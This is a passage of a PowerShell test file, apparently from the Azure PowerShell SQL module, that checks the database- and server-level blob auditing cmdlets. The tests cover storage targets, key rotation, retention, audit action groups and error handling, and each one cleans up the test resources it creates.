














function Test-BlobAuditDatabaseUpdatePolicyWithStorage
{
	
	$testSuffix = getAssetName
	Create-BlobAuditingTestEnvironment $testSuffix
	$params = Get-SqlBlobAuditingTestEnvironmentParameters $testSuffix

	try 
	{
		
		Set-AzSqlDatabaseAudit -BlobStorageTargetState Enabled -ResourceGroupName $params.rgname -ServerName $params.serverName -DatabaseName $params.databaseName -StorageAccountResourceId $params.storageAccountResourceId
		$policy = Get-AzSqlDatabaseAudit -ResourceGroupName $params.rgname -ServerName $params.serverName -DatabaseName $params.databaseName
	
		
		Assert-AreEqual $policy.StorageAccountResourceId $params.storageAccountResourceId
		Assert-AreEqual $policy.BlobStorageTargetState "Enabled"  
	}
	finally
	{
		
		Remove-BlobAuditingTestEnvironment $testSuffix
	}
}


function Test-BlobAuditDatabaseUpdatePolicyWithSameNameStorageOnDifferentRegion
{
	
	$testSuffix = getAssetName
	Create-BlobAuditingTestEnvironment $testSuffix
	$params = Get-SqlBlobAuditingTestEnvironmentParameters $testSuffix

	try 
	{
		
		Set-AzSqlDatabaseAudit -BlobStorageTargetState Enabled -ResourceGroupName $params.rgname -ServerName $params.serverName -DatabaseName $params.databaseName -StorageAccountResourceId $params.storageAccountResourceId
		$policy = Get-AzSqlDatabaseAudit -ResourceGroupName $params.rgname -ServerName $params.serverName -DatabaseName $params.databaseName
	
		
		Assert-AreEqual $policy.StorageAccountResourceId $params.storageAccountResourceId
		Assert-AreEqual $policy.BlobStorageTargetState "Enabled"  

		$newResourceGroupName =  "test-rg2-for-sql-cmdlets-" + $testSuffix
		New-AzureRmResourceGroup -Location "West Europe" -ResourceGroupName $newResourceGroupName
		New-AzureRmStorageAccount -StorageAccountName $params.storageAccount  -ResourceGroupName $newResourceGroupName -Location "West Europe" -Type Standard_GRS

		Set-AzSqlDatabaseAudit -BlobStorageTargetState Enabled -ResourceGroupName $params.rgname -ServerName $params.serverName -DatabaseName $params.databaseName -StorageAccountResourceId $params.storageAccountResourceId
		$policy = Get-AzSqlDatabaseAudit -ResourceGroupName $params.rgname -ServerName $params.serverName -DatabaseName $params.databaseName
	
		
		Assert-AreEqual $policy.StorageAccountResourceId $params.storageAccountResourceId
		Assert-AreEqual $policy.BlobStorageTargetState "Enabled"  
	}
	finally
	{
		
		Remove-AzureRmResourceGroup -Name $newResourceGroupName -Force
		Remove-BlobAuditingTestEnvironment $testSuffix
	}
}


function Test-BlobAuditServerUpdatePolicyWithStorage
{
	
	$testSuffix = getAssetName
	Create-BlobAuditingTestEnvironment $testSuffix
	$params = Get-SqlBlobAuditingTestEnvironmentParameters $testSuffix

	try
	{
		
		Set-AzSqlServerAudit -BlobStorageTargetState Enabled -ResourceGroupName $params.rgname -ServerName $params.serverName -StorageAccountResourceId $params.storageAccountResourceId
		$policy = Get-AzSqlServerAudit -ResourceGroupName $params.rgname -ServerName $params.serverName
	
		
		Assert-AreEqual $policy.StorageAccountResourceId $params.storageAccountResourceId
		Assert-AreEqual $policy.BlobStorageTargetState "Enabled" 
	}
	finally
	{
		
		Remove-BlobAuditingTestEnvironment $testSuffix
	}
}


function Test-BlobAuditDatabaseUpdatePolicyKeepPreviousStorage
{
	
	$testSuffix = getAssetName
	Create-BlobAuditingTestEnvironment $testSuffix
	$params = Get-SqlBlobAuditingTestEnvironmentParameters $testSuffix

	try 
	{
		
		Set-AzSqlDatabaseAudit -BlobStorageTargetState Enabled -ResourceGroupName $params.rgname -ServerName $params.serverName -DatabaseName $params.databaseName -StorageAccountResourceId $params.storageAccountResourceId
		$policyBefore = Get-AzSqlDatabaseAudit -ResourceGroupName $params.rgname -ServerName $params.serverName -DatabaseName $params.databaseName

		Set-AzSqlDatabaseAudit -BlobStorageTargetState Enabled -ResourceGroupName $params.rgname -ServerName $params.serverName -DatabaseName $params.databaseName
		$policyAfter = Get-AzSqlDatabaseAudit -ResourceGroupName $params.rgname -ServerName $params.serverName -DatabaseName $params.databaseName
	
		
		Assert-AreEqual $policyBefore.StorageAccountResourceId $policyAfter.StorageAccountResourceId
		Assert-AreEqual $policyAfter.StorageAccountResourceId $params.storageAccountResourceId 

	}
	finally
	{
		
		Remove-BlobAuditingTestEnvironment $testSuffix
	}
}


function Test-BlobAuditServerUpdatePolicyKeepPreviousStorage
{
	
	$testSuffix = getAssetName
	Create-BlobAuditingTestEnvironment $testSuffix
	$params = Get-SqlBlobAuditingTestEnvironmentParameters $testSuffix

	try 
	{
		
		Set-AzSqlServerAudit -BlobStorageTargetState Enabled -ResourceGroupName $params.rgname -ServerName $params.serverName -StorageAccountResourceId $params.storageAccountResourceId
		$policyBefore = Get-AzSqlServerAudit -ResourceGroupName $params.rgname -ServerName $params.serverName

		Set-AzSqlServerAudit -BlobStorageTargetState Enabled -ResourceGroupName $params.rgname -ServerName $params.serverName 
		$policyAfter = Get-AzSqlServerAudit -ResourceGroupName $params.rgname -ServerName $params.serverName
	
		
		Assert-AreEqual $policyBefore.StorageAccountResourceId $policyAfter.StorageAccountResourceId
		Assert-AreEqual $policyAfter.StorageAccountResourceId $params.storageAccountResourceId 

	}
	finally
	{
		
		Remove-BlobAuditingTestEnvironment $testSuffix
	}
}


function Test-BlobAuditDisableDatabaseAudit
{
	
	$testSuffix = getAssetName
	Create-BlobAuditingTestEnvironment $testSuffix
	$params = Get-SqlBlobAuditingTestEnvironmentParameters $testSuffix

	try
	{
		
		Set-AzSqlDatabaseAudit -BlobStorageTargetState Enabled -ResourceGroupName $params.rgname -ServerName $params.serverName -DatabaseName $params.databaseName -StorageAccountResourceId $params.storageAccountResourceId
		Set-AzSqlServerAudit -BlobStorageTargetState Enabled -ResourceGroupName $params.rgname -ServerName $params.serverName -StorageAccountResourceId $params.storageAccountResourceId
		$policy = Get-AzSqlDatabaseAudit -ResourceGroupName $params.rgname -ServerName $params.serverName -DatabaseName $params.databaseName
		
		
		Assert-AreEqual $policy.BlobStorageTargetState "Enabled"

		
		Set-AzSqlDatabaseAudit -BlobStorageTargetState Disabled -ResourceGroupName $params.rgname -ServerName $params.serverName -DatabaseName $params.databaseName
		$policy = Get-AzSqlDatabaseAudit -ResourceGroupName $params.rgname -ServerName $params.serverName -DatabaseName $params.databaseName
	
		
		Assert-AreEqual $policy.BlobStorageTargetState "Disabled"
	}
	finally
	{
		
		Remove-BlobAuditingTestEnvironment $testSuffix
	}
}


function Test-BlobAuditDisableServerAudit
{
	
	$testSuffix = getAssetName
	Create-BlobAuditingTestEnvironment $testSuffix
	$params = Get-SqlBlobAuditingTestEnvironmentParameters $testSuffix

	try
	{
		
		Set-AzSqlServerAudit -BlobStorageTargetState Enabled -ResourceGroupName $params.rgname -ServerName $params.serverName -StorageAccountResourceId $params.storageAccountResourceId
		Set-AzSqlServerAudit -BlobStorageTargetState Disabled -ResourceGroupName $params.rgname -ServerName $params.serverName
		$policy = Get-AzSqlServerAudit -ResourceGroupName $params.rgname -ServerName $params.serverName
	
		
		Assert-AreEqual $policy.BlobStorageTargetState "Disabled"
	}
	finally
	{
		
		Remove-BlobAuditingTestEnvironment $testSuffix
	}
}


function Test-BlobAuditFailedDatabaseUpdatePolicyWithNoStorage
{
	
	$testSuffix = getAssetName
	Create-BlobAuditingTestEnvironment $testSuffix
	$params = Get-SqlBlobAuditingTestEnvironmentParameters $testSuffix

	try
	{
		
		Assert-Throws { Set-AzSqlDatabaseAudit -BlobStorageTargetState Enabled -ResourceGroupName $params.rgname -ServerName $params.serverWithoutPolicy -DatabaseName $params.databaseWithoutPolicy }
	}
	finally
	{
		
		Remove-BlobAuditingTestEnvironment $testSuffix
	}
}


function Test-BlobAuditFailedServerUpdatePolicyWithNoStorage
{
	
	$testSuffix = getAssetName
	Create-BlobAuditingTestEnvironment $testSuffix
	$params = Get-SqlBlobAuditingTestEnvironmentParameters $testSuffix

	try
	{
		
		Assert-Throws { Set-AzSqlServerAudit -BlobStorageTargetState Enabled -ResourceGroupName $params.rgname -ServerName $params.serverWithoutPolicy}
	}
	finally
	{
		
		Remove-BlobAuditingTestEnvironment $testSuffix
	}
}


function Test-BlobAuditFailWithBadDatabaseIndentity
{
	
	$testSuffix = getAssetName
	Create-BlobAuditingTestEnvironment $testSuffix
	$params = Get-SqlBlobAuditingTestEnvironmentParameters $testSuffix

	try 
	{
		
		Assert-Throws { Get-AzSqlDatabaseAudit -ResourceGroupName "NONEXISTING-RG" -ServerName $params.serverName -DatabaseName $params.databaseName }
		Assert-Throws { Get-AzSqlDatabaseAudit -ResourceGroupName $params.rgname -ServerName "NONEXISTING-SERVER"-DatabaseName $params.databaseName }
		Assert-Throws { Set-AzSqlDatabaseAudit -BlobStorageTargetState Enabled -ResourceGroupName "NONEXISTING-RG"  -ServerName $params.serverName -DatabaseName $params.databaseName -StorageAccountResourceId $params.storageAccountResourceId}
		Assert-Throws { Set-AzSqlDatabaseAudit -BlobStorageTargetState Enabled -ResourceGroupName $params.rgname -ServerName "NONEXISTING-SERVER" -DatabaseName $params.databaseName -StorageAccountResourceId $params.storageAccountResourceId}
	}
	finally
	{
		
		Remove-BlobAuditingTestEnvironment $testSuffix
	}
}


function Test-BlobAuditFailWithBadServerIndentity
{
	
	$testSuffix = getAssetName
	Create-BlobAuditingTestEnvironment $testSuffix
	$params = Get-SqlBlobAuditingTestEnvironmentParameters $testSuffix

	try 
	{
		
		Assert-Throws { Get-AzSqlServerAudit -ResourceGroupName "NONEXISTING-RG" -ServerName $params.serverName }
		Assert-Throws { Get-AzSqlServerAudit -ResourceGroupName $params.rgname -ServerName "NONEXISTING-SERVER" }
		Assert-Throws { Set-AzSqlServerAudit -BlobStorageTargetState Enabled -ResourceGroupName "NONEXISTING-RG"  -ServerName $params.serverName -StorageAccountResourceId $params.storageAccountResourceId}
		Assert-Throws { Set-AzSqlServerAudit -BlobStorageTargetState Enabled -ResourceGroupName $params.rgname -ServerName "NONEXISTING-SERVER" -StorageAccountResourceId $params.storageAccountResourceId}
	}
	finally
	{
		
		Remove-BlobAuditingTestEnvironment $testSuffix
	}
}


function Test-BlobAuditServerStorageKeyRotation
{
	
	$testSuffix = getAssetName
	Create-BlobAuditingTestEnvironment $testSuffix
	$params = Get-SqlBlobAuditingTestEnvironmentParameters $testSuffix

	try
	{
		
		Set-AzSqlServerAudit -BlobStorageTargetState Enabled -ResourceGroupName $params.rgname -ServerName $params.serverName -StorageAccountResourceId $params.storageAccountResourceId -StorageKeyType "Primary"
		$policy = Get-AzSqlServerAudit -ResourceGroupName $params.rgname -ServerName $params.serverName 
	
		
		Assert-True { $policy.StorageKeyType -eq  "Primary"}

		
		Set-AzSqlServerAudit -BlobStorageTargetState Enabled -ResourceGroupName $params.rgname -ServerName $params.serverName -StorageAccountResourceId $params.storageAccountResourceId -StorageKeyType "Secondary"
		$policy = Get-AzSqlServerAudit -ResourceGroupName $params.rgname -ServerName $params.serverName 
	
		
		Assert-True { $policy.StorageKeyType -eq  "Secondary"}

		
		Set-AzSqlServerAudit -BlobStorageTargetState Enabled -ResourceGroupName $params.rgname -ServerName $params.serverName -StorageAccountResourceId $params.storageAccountResourceId -StorageKeyType "Primary"
		$policy = Get-AzSqlServerAudit -ResourceGroupName $params.rgname -ServerName $params.serverName 
	
		
		Assert-True { $policy.StorageKeyType -eq  "Primary"}
	}
	finally
	{
		
		Remove-BlobAuditingTestEnvironment $testSuffix
	}
}


function Test-BlobAuditDatabaseStorageKeyRotation
{
	
	$testSuffix = getAssetName
	Create-BlobAuditingTestEnvironment $testSuffix
	$params = Get-SqlBlobAuditingTestEnvironmentParameters $testSuffix

	try
	{
		
		Set-AzSqlDatabaseAudit -BlobStorageTargetState Enabled -ResourceGroupName $params.rgname -ServerName $params.serverName  -DatabaseName $params.databaseName -StorageAccountResourceId $params.storageAccountResourceId -StorageKeyType "Primary"
		$policy = Get-AzSqlDatabaseAudit -ResourceGroupName $params.rgname -ServerName $params.serverName  -DatabaseName $params.databaseName
	
		
		Assert-True { $policy.StorageKeyType -eq  "Primary"}

		
		Set-AzSqlDatabaseAudit -BlobStorageTargetState Enabled -ResourceGroupName $params.rgname -ServerName $params.serverName  -DatabaseName $params.databaseName -StorageAccountResourceId $params.storageAccountResourceId -StorageKeyType "Secondary"
		$policy = Get-AzSqlDatabaseAudit -ResourceGroupName $params.rgname -ServerName $params.serverName  -DatabaseName $params.databaseName
	
		
		Assert-True { $policy.StorageKeyType -eq  "Secondary"}

		
		Set-AzSqlDatabaseAudit -BlobStorageTargetState Enabled -ResourceGroupName $params.rgname -ServerName $params.serverName  -DatabaseName $params.databaseName -StorageAccountResourceId $params.storageAccountResourceId -StorageKeyType "Primary"
		$policy = Get-AzSqlDatabaseAudit -ResourceGroupName $params.rgname -ServerName $params.serverName  -DatabaseName $params.databaseName
	
		
		Assert-True { $policy.StorageKeyType -eq  "Primary"}
	}
	finally
	{
		
		Remove-BlobAuditingTestEnvironment $testSuffix
	}
}


function Test-BlobAuditServerRetentionKeepProperties
{
	
	$testSuffix = getAssetName
	Create-BlobAuditingTestEnvironment $testSuffix
	$params = Get-SqlBlobAuditingTestEnvironmentParameters $testSuffix

	try
	{
		
		Set-AzSqlServerAudit -BlobStorageTargetState Enabled -ResourceGroupName $params.rgname -ServerName $params.serverName -StorageAccountResourceId $params.storageAccountResourceId -RetentionInDays 10;

		Set-AzSqlServerAudit -BlobStorageTargetState Enabled -ResourceGroupName $params.rgname -ServerName $params.serverName -StorageAccountResourceId $params.storageAccountResourceId -RetentionInDays 11;
		$policy = Get-AzSqlServerAudit -ResourceGroupName $params.rgname -ServerName $params.serverName

		
		Assert-AreEqual $policy.RetentionInDays 11

		
		Set-AzSqlServerAudit -BlobStorageTargetState Enabled -ResourceGroupName $params.rgname -ServerName $params.serverName -StorageAccountResourceId $params.storageAccountResourceId;
		$policy = Get-AzSqlServerAudit -ResourceGroupName $params.rgname -ServerName $params.serverName

		
		Assert-AreEqual $policy.RetentionInDays 11
	}
	finally
	{
		
		Remove-BlobAuditingTestEnvironment $testSuffix
	}
}


function Test-BlobAuditDatabaseRetentionKeepProperties
{
	
	$testSuffix = getAssetName
	Create-BlobAuditingTestEnvironment $testSuffix
	$params = Get-SqlBlobAuditingTestEnvironmentParameters $testSuffix

	try
	{
		
		Set-AzSqlDatabaseAudit -BlobStorageTargetState Enabled -ResourceGroupName $params.rgname -ServerName $params.serverName -DatabaseName $params.databaseName -StorageAccountResourceId $params.storageAccountResourceId -RetentionInDays 10;
	
		Set-AzSqlDatabaseAudit -BlobStorageTargetState Enabled -ResourceGroupName $params.rgname -ServerName $params.serverName -DatabaseName $params.databaseName -StorageAccountResourceId $params.storageAccountResourceId -RetentionInDays 11;
		$policy = Get-AzSqlDatabaseAudit -ResourceGroupName $params.rgname -ServerName $params.serverName -DatabaseName $params.databaseName

		
		Assert-AreEqual $policy.RetentionInDays 11

		
		Set-AzSqlDatabaseAudit -BlobStorageTargetState Enabled -ResourceGroupName $params.rgname -ServerName $params.serverName -DatabaseName $params.databaseName -StorageAccountResourceId $params.storageAccountResourceId;
		$policy = Get-AzSqlDatabaseAudit -ResourceGroupName $params.rgname -ServerName $params.serverName -DatabaseName $params.databaseName

		
		Assert-AreEqual $policy.RetentionInDays 11
	}
	finally
	{
		
		Remove-BlobAuditingTestEnvironment $testSuffix
	}
}


function Test-BlobAuditOnDatabase
{
	
	$testSuffix = getAssetName
	Create-BlobAuditingTestEnvironment $testSuffix
	$params = Get-SqlBlobAuditingTestEnvironmentParameters $testSuffix
	$dbName = $params.databaseName

	try
	{
		
		Set-AzSqlDatabaseAudit -BlobStorageTargetState Enabled -ResourceGroupName $params.rgname -ServerName $params.serverName -DatabaseName $params.databaseName -StorageAccountResourceId $params.storageAccountResourceId -AuditActionGroup "SUCCESSFUL_DATABASE_AUTHENTICATION_GROUP", "FAILED_DATABASE_AUTHENTICATION_GROUP" -RetentionInDays 8 
		$policy = Get-AzSqlDatabaseAudit -ResourceGroupName $params.rgname -ServerName $params.serverName -DatabaseName $params.databaseName
	
		
		Assert-AreEqual $policy.BlobStorageTargetState "Enabled"
		Assert-AreEqual $policy.AuditActionGroup.Length 2
		Assert-True {$policy.AuditActionGroup.Contains([Microsoft.Azure.Commands.Sql.Auditing.Model.AuditActionGroups]::SUCCESSFUL_DATABASE_AUTHENTICATION_GROUP)}
		Assert-True {$policy.AuditActionGroup.Contains([Microsoft.Azure.Commands.Sql.Auditing.Model.AuditActionGroups]::FAILED_DATABASE_AUTHENTICATION_GROUP)}
		Assert-AreEqual $policy.AuditAction.Length 0
		Assert-AreEqual $policy.RetentionInDays 8
		Assert-True { $policy.StorageKeyType -eq  "Primary"}
		
		
		Set-AzSqlDatabaseAudit -BlobStorageTargetState Enabled -ResourceGroupName $params.rgname -ServerName $params.serverName -DatabaseName $params.databaseName -StorageAccountResourceId $params.storageAccountResourceId -StorageKeyType "Secondary" -AuditActionGroup "SUCCESSFUL_DATABASE_AUTHENTICATION_GROUP", "FAILED_DATABASE_AUTHENTICATION_GROUP" -RetentionInDays 8 -AuditAction "UPDATE ON database::[$($params.databaseName)] BY [public]"
		$policy = Get-AzSqlDatabaseAudit -ResourceGroupName $params.rgname -ServerName $params.serverName -DatabaseName $params.databaseName
		
		
		Assert-AreEqual $policy.BlobStorageTargetState "Enabled"
		Assert-AreEqual $policy.AuditActionGroup.Length 2
		Assert-True {$policy.AuditActionGroup.Contains([Microsoft.Azure.Commands.Sql.Auditing.Model.AuditActionGroups]::SUCCESSFUL_DATABASE_AUTHENTICATION_GROUP)}
		Assert-True {$policy.AuditActionGroup.Contains([Microsoft.Azure.Commands.Sql.Auditing.Model.AuditActionGroups]::FAILED_DATABASE_AUTHENTICATION_GROUP)}
		Assert-AreEqual $policy.RetentionInDays 8
		Assert-True { $policy.StorageKeyType -eq  "Secondary"}
		Assert-AreEqual $policy.AuditAction.Length 1
		Assert-AreEqual $policy.AuditAction "UPDATE ON database::[$($params.databaseName)] BY [public]"
		
		
		Set-AzSqlDatabaseAudit -BlobStorageTargetState Disabled -ResourceGroupName $params.rgname -ServerName $params.serverName -DatabaseName $params.databaseName
		$policy = Get-AzSqlDatabaseAudit -ResourceGroupName $params.rgname -ServerName $params.serverName -DatabaseName $params.databaseName
		
		
		Assert-AreEqual $policy.BlobStorageTargetState "Disabled"
		Assert-AreEqual $policy.AuditAction.Length 1
		
		
		Set-AzSqlDatabaseAudit -BlobStorageTargetState Disabled -ResourceGroupName $params.rgname -ServerName $params.serverName -DatabaseName $params.databaseName -AuditActionGroup @() -AuditAction "UPDATE ON database::[$($params.databaseName)] BY [public]"
		$policy = Get-AzSqlDatabaseAudit -ResourceGroupName $params.rgname -ServerName $params.serverName -DatabaseName $params.databaseName
		
		
		Assert-AreEqual $policy.AuditActionGroup.Length 0
		Assert-AreEqual $policy.AuditAction.Length 1
		Assert-AreEqual $policy.AuditAction[0] "UPDATE ON database::[$($params.databaseName)] BY [public]"
	}
	finally
	{
		
		Remove-BlobAuditingTestEnvironment $testSuffix
	}
}


function Test-BlobAuditOnServer
{
	
	$testSuffix = getAssetName
	Create-BlobAuditingTestEnvironment $testSuffix
	$params = Get-SqlBlobAuditingTestEnvironmentParameters $testSuffix

	try
	{
		
		Set-AzSqlServerAudit -BlobStorageTargetState Enabled -ResourceGroupName $params.rgname -ServerName $params.serverName -StorageAccountResourceId $params.storageAccountResourceId -AuditActionGroup "SUCCESSFUL_DATABASE_AUTHENTICATION_GROUP", "FAILED_DATABASE_AUTHENTICATION_GROUP" -RetentionInDays 8
		$policy = Get-AzSqlServerAudit -ResourceGroupName $params.rgname -ServerName $params.serverName
	
		
		Assert-AreEqual $policy.BlobStorageTargetState "Enabled"
		Assert-AreEqual $policy.AuditActionGroup.Length 2
		Assert-True {$policy.AuditActionGroup.Contains([Microsoft.Azure.Commands.Sql.Auditing.Model.AuditActionGroups]::SUCCESSFUL_DATABASE_AUTHENTICATION_GROUP)}
		Assert-True {$policy.AuditActionGroup.Contains([Microsoft.Azure.Commands.Sql.Auditing.Model.AuditActionGroups]::FAILED_DATABASE_AUTHENTICATION_GROUP)}
		Assert-AreEqual $policy.RetentionInDays 8
		Assert-AreEqual $policy.StorageKeyType "Primary"

		
		Set-AzSqlServerAudit -BlobStorageTargetState Enabled -ResourceGroupName $params.rgname -ServerName $params.serverName -StorageAccountResourceId $params.storageAccountResourceId -StorageKeyType "Secondary" -AuditActionGroup "SUCCESSFUL_DATABASE_AUTHENTICATION_GROUP", "FAILED_DATABASE_AUTHENTICATION_GROUP" -RetentionInDays 8
		$policy = Get-AzSqlServerAudit -ResourceGroupName $params.rgname -ServerName $params.serverName
	
		
		Assert-AreEqual $policy.BlobStorageTargetState "Enabled"
		Assert-AreEqual $policy.AuditActionGroup.Length 2
		Assert-True {$policy.AuditActionGroup.Contains([Microsoft.Azure.Commands.Sql.Auditing.Model.AuditActionGroups]::SUCCESSFUL_DATABASE_AUTHENTICATION_GROUP)}
		Assert-True {$policy.AuditActionGroup.Contains([Microsoft.Azure.Commands.Sql.Auditing.Model.AuditActionGroups]::FAILED_DATABASE_AUTHENTICATION_GROUP)}
		Assert-AreEqual $policy.RetentionInDays 8
		Assert-AreEqual $policy.StorageKeyType "Secondary"

		
		Set-AzSqlServerAudit -BlobStorageTargetState Disabled -ResourceGroupName $params.rgname -ServerName $params.serverName
		$policy = Get-AzSqlServerAudit -ResourceGroupName $params.rgname -ServerName $params.serverName
	
		
		Assert-AreEqual $policy.BlobStorageTargetState "Disabled"
	}
	finally
	{
		
		Remove-BlobAuditingTestEnvironment $testSuffix
	}
}


function Test-BlobAuditWithAuditActionGroups
{
	$testSuffix = getAssetName
	Create-BlobAuditingTestEnvironment $testSuffix
	$params = Get-SqlBlobAuditingTestEnvironmentParameters $testSuffix

	try
	{
		
		Set-AzSqlDatabaseAudit -BlobStorageTargetState Enabled -ResourceGroupName $params.rgname -ServerName $params.serverName -DatabaseName $params.databaseName -StorageAccountResourceId $params.storageAccountResourceId
		$policy = Get-AzSqlDatabaseAudit -ResourceGroupName $params.rgname -ServerName $params.serverName -DatabaseName $params.databaseName
	
		
		Assert-AreEqual $policy.AuditActionGroup.Length 3
		Assert-True {$policy.AuditActionGroup.Contains([Microsoft.Azure.Commands.Sql.Auditing.Model.AuditActionGroups]::SUCCESSFUL_DATABASE_AUTHENTICATION_GROUP)}
		Assert-True {$policy.AuditActionGroup.Contains([Microsoft.Azure.Commands.Sql.Auditing.Model.AuditActionGroups]::FAILED_DATABASE_AUTHENTICATION_GROUP)}
		Assert-True {$policy.AuditActionGroup.Contains([Microsoft.Azure.Commands.Sql.Auditing.Model.AuditActionGroups]::BATCH_COMPLETED_GROUP)}

		
		Set-AzSqlDatabaseAudit -BlobStorageTargetState Enabled -ResourceGroupName $params.rgname -ServerName $params.serverName -DatabaseName $params.databaseName -StorageAccountResourceId $params.storageAccountResourceId -AuditActionGroup "APPLICATION_ROLE_CHANGE_PASSWORD_GROUP","DATABASE_OBJECT_PERMISSION_CHANGE_GROUP"
		$policy = Get-AzSqlDatabaseAudit -ResourceGroupName $params.rgname -ServerName $params.serverName -DatabaseName $params.databaseName
	
		
		Assert-AreEqual $policy.AuditActionGroup.Length 2
		Assert-True {$policy.AuditActionGroup.Contains([Microsoft.Azure.Commands.Sql.Auditing.Model.AuditActionGroups]::APPLICATION_ROLE_CHANGE_PASSWORD_GROUP)}
		Assert-True {$policy.AuditActionGroup.Contains([Microsoft.Azure.Commands.Sql.Auditing.Model.AuditActionGroups]::DATABASE_OBJECT_PERMISSION_CHANGE_GROUP)} 

		
		Set-AzSqlDatabaseAudit -BlobStorageTargetState Enabled -ResourceGroupName $params.rgname -ServerName $params.serverName -DatabaseName $params.databaseName -StorageAccountResourceId $params.storageAccountResourceId -AuditActionGroup "DATABASE_OPERATION_GROUP","DATABASE_LOGOUT_GROUP"
		$policy = Get-AzSqlDatabaseAudit -ResourceGroupName $params.rgname -ServerName $params.serverName -DatabaseName $params.databaseName
	
		
		Assert-AreEqual $policy.AuditActionGroup.Length 2
		Assert-True {$policy.AuditActionGroup.Contains([Microsoft.Azure.Commands.Sql.Auditing.Model.AuditActionGroups]::DATABASE_OPERATION_GROUP)}
		Assert-True {$policy.AuditActionGroup.Contains([Microsoft.Azure.Commands.Sql.Auditing.Model.AuditActionGroups]::DATABASE_LOGOUT_GROUP)}

		
		Set-AzSqlDatabaseAudit -BlobStorageTargetState Enabled -ResourceGroupName $params.rgname -ServerName $params.serverName -DatabaseName $params.databaseName -StorageAccountResourceId $params.storageAccountResourceId
		$policy = Get-AzSqlDatabaseAudit -ResourceGroupName $params.rgname -ServerName $params.serverName -DatabaseName $params.databaseName
	
		
		Assert-AreEqual $policy.AuditActionGroup.Length 2
		Assert-True {$policy.AuditActionGroup.Contains([Microsoft.Azure.Commands.Sql.Auditing.Model.AuditActionGroups]::DATABASE_OPERATION_GROUP)}
		Assert-True {$policy.AuditActionGroup.Contains([Microsoft.Azure.Commands.Sql.Auditing.Model.AuditActionGroups]::DATABASE_LOGOUT_GROUP)}

		
		Set-AzSqlServerAudit -BlobStorageTargetState Enabled -ResourceGroupName $params.rgname -ServerName $params.serverName -StorageAccountResourceId $params.storageAccountResourceId
		$policy = Get-AzSqlServerAudit -ResourceGroupName $params.rgname -ServerName $params.serverName
	
		
		Assert-AreEqual $policy.AuditActionGroup.Length 3
		Assert-True {$policy.AuditActionGroup.Contains([Microsoft.Azure.Commands.Sql.Auditing.Model.AuditActionGroups]::SUCCESSFUL_DATABASE_AUTHENTICATION_GROUP)}
		Assert-True {$policy.AuditActionGroup.Contains([Microsoft.Azure.Commands.Sql.Auditing.Model.AuditActionGroups]::FAILED_DATABASE_AUTHENTICATION_GROUP)}
		Assert-True {$policy.AuditActionGroup.Contains([Microsoft.Azure.Commands.Sql.Auditing.Model.AuditActionGroups]::BATCH_COMPLETED_GROUP)}

		
		Set-AzSqlServerAudit -BlobStorageTargetState Enabled -ResourceGroupName $params.rgname -ServerName $params.serverName -StorageAccountResourceId $params.storageAccountResourceId -AuditActionGroup "APPLICATION_ROLE_CHANGE_PASSWORD_GROUP","DATABASE_OBJECT_PERMISSION_CHANGE_GROUP"
		$policy = Get-AzSqlServerAudit -ResourceGroupName $params.rgname -ServerName $params.serverName
	
		
		Assert-AreEqual $policy.AuditActionGroup.Length 2
		Assert-True {$policy.AuditActionGroup.Contains([Microsoft.Azure.Commands.Sql.Auditing.Model.AuditActionGroups]::APPLICATION_ROLE_CHANGE_PASSWORD_GROUP)}
		Assert-True {$policy.AuditActionGroup.Contains([Microsoft.Azure.Commands.Sql.Auditing.Model.AuditActionGroups]::DATABASE_OBJECT_PERMISSION_CHANGE_GROUP)}

		
		Set-AzSqlServerAudit -BlobStorageTargetState Enabled -ResourceGroupName $params.rgname -ServerName $params.serverName -StorageAccountResourceId $params.storageAccountResourceId -AuditActionGroup "DATABASE_OPERATION_GROUP","DATABASE_LOGOUT_GROUP"
		$policy = Get-AzSqlServerAudit -ResourceGroupName $params.rgname -ServerName $params.serverName
	
		
		Assert-AreEqual $policy.AuditActionGroup.Length 2
		Assert-True {$policy.AuditActionGroup.Contains([Microsoft.Azure.Commands.Sql.Auditing.Model.AuditActionGroups]::DATABASE_OPERATION_GROUP)}
		Assert-True {$policy.AuditActionGroup.Contains([Microsoft.Azure.Commands.Sql.Auditing.Model.AuditActionGroups]::DATABASE_LOGOUT_GROUP)}

		
		Set-AzSqlServerAudit -BlobStorageTargetState Enabled -ResourceGroupName $params.rgname -ServerName $params.serverName -StorageAccountResourceId $params.storageAccountResourceId
		$policy = Get-AzSqlServerAudit -ResourceGroupName $params.rgname -ServerName $params.serverName
	
		
		Assert-AreEqual $policy.AuditActionGroup.Length 2
		Assert-True {$policy.AuditActionGroup.Contains([Microsoft.Azure.Commands.Sql.Auditing.Model.AuditActionGroups]::DATABASE_OPERATION_GROUP)}
		Assert-True {$policy.AuditActionGroup.Contains([Microsoft.Azure.Commands.Sql.Auditing.Model.AuditActionGroups]::DATABASE_LOGOUT_GROUP)}
	}
	finally
	{
		
		Remove-BlobAuditingTestEnvironment $testSuffix
	}
}


function Test-ExtendedAuditOnServer
{
	
	$testSuffix = getAssetName
	Create-BlobAuditingTestEnvironment $testSuffix
	$params = Get-SqlBlobAuditingTestEnvironmentParameters $testSuffix

	try
	{
		
		Set-AzSqlServerAudit -BlobStorageTargetState Enabled -ResourceGroupName $params.rgname -ServerName $params.serverName -StorageAccountResourceId $params.storageAccountResourceId -AuditActionGroup "SUCCESSFUL_DATABASE_AUTHENTICATION_GROUP", "FAILED_DATABASE_AUTHENTICATION_GROUP" -RetentionInDays 8
		$policy = Get-AzSqlServerAudit -ResourceGroupName $params.rgname -ServerName $params.serverName
		Assert-AreEqual "Enabled" $policy.BlobStorageTargetState
		Assert-AreEqual 2 $policy.AuditActionGroup.Length
		Assert-True {$policy.AuditActionGroup.Contains([Microsoft.Azure.Commands.Sql.Auditing.Model.AuditActionGroups]::SUCCESSFUL_DATABASE_AUTHENTICATION_GROUP)}
		Assert-True {$policy.AuditActionGroup.Contains([Microsoft.Azure.Commands.Sql.Auditing.Model.AuditActionGroups]::FAILED_DATABASE_AUTHENTICATION_GROUP)}
		Assert-AreEqual 8 $policy.RetentionInDays
		Assert-AreEqual "Primary" $policy.StorageKeyType
		Assert-AreEqual "" $policy.PredicateExpression

		
		Set-AzSqlServerAudit -BlobStorageTargetState Enabled -ResourceGroupName $params.rgname -ServerName $params.serverName -StorageAccountResourceId $params.storageAccountResourceId -AuditActionGroup "SUCCESSFUL_DATABASE_AUTHENTICATION_GROUP", "FAILED_DATABASE_AUTHENTICATION_GROUP" -RetentionInDays 8 -PredicateExpression "statement <> 'select 1'"
		$policy = Get-AzSqlServerAudit -ResourceGroupName $params.rgname -ServerName $params.serverName
